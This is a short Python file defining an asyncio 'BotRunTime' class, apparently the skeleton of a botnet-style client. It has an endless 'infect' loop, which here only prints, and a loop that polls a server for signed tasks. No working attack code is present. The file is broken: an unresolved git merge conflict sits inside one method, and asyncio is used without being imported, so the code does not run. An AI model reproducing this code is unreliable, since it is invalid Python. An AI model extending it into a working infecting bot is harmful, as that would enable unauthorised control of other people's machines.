import settings

class BotRunTime:
    def __init__(self, loop, server):
        self.loop = loop
        self.server = server
        loop.create_task(self.infect())
        loop.create_task(self.get_and_schedule_job())
        self.run()

    async def infect(self):
        while True:
            print('infect')
            await asyncio.sleep(settings.INFECTION_CYCLE_TIME)

    async def get_and_schedule_job(self):
        while True:
<<<<<<< HEAD
            print('getting and scheduling job')
	    
=======
            signed_task_description = self.server.get('task')
            print(signed_task_description)
>>>>>>> feaf8f2a5e320afe24e16b3fec030332a8b87e97
            await asyncio.sleep(settings.GET_JOB_CYCLE_TIME)

    def run(self):
        try:
            self.loop.run_forever()
        except KeyboardInterrupt:
            pass
        finally:
            self.server.stop()
            self.loop.close()
